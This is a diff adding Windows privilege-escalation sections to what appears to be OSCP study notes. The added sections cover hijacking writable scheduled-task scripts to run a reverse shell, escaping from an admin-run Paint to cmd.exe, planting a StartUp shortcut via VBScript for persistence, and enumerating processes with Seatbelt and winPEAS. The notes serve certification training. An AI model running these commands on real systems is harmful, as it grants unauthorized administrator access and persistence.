@@ -224,7 +224,50 @@ pth-winexe --system -U 'admin%hash:hash' //10.10.165.36 cmd.exe
 
 # Scheduled Tasks
 ```bash
+# There's no easy method for enumerating custom tasks that belong to other users as a low privileged user account
+schtasks /query 
+Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
 
+# When you find a file that looks like a scheduled task, run this to see if you can write to this file
+accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1
+
+# Let's write to this file to trigger reverse shell
+echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1
+```
+
+# Insecure GUI Apps
+![image](https://github.com/nuricheun/OSCP/assets/14031269/e4d2e8f2-dc4a-4b1e-ac4b-4b2e507d5f21)
+
+```bash
+# Double-click the "AdminPaint" shortcut on your Desktop. Once it is running, open a command prompt and note that Paint is running with admin privileges:
+tasklist /V | findstr mspaint.exe
+# In Paint, click "File" and then "Open". In the open file dialog box, click in the navigation input and paste: file://c:/windows/system32/cmd.exe
 
 ```
 
+# Startup Apps
+```bash
+# Using accesschk.exe, note that the BUILTIN\Users group can write files to the StartUp directory:
+C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
+
+# use this script to create a shortcut in StartUp directory
+Set oWS = WScript.CreateObject("WScript.Shell")
+sLinkFile = "C:\ProgramData\Microsoft\Windows\Start 
+Menu\Programs\StartUp\reverse.lnk"
+Set oLink = oWS.CreateShortcut(sLinkFile)
+oLink.TargetPath = "C:\PrivEsc\reverse.exe"
+oLink.Save
+
+```
+
+# Installed Applications
+```bash
+# Manually enumerate all running programs
+tasklist /v
+
+# We can use Seatbelt to search for nonstandard processes
+.\seatbelt.exe NonstandardProcesses
+
+# we can use winpeas as well
+ .\winPEASany.exe quiet processinfo
+```
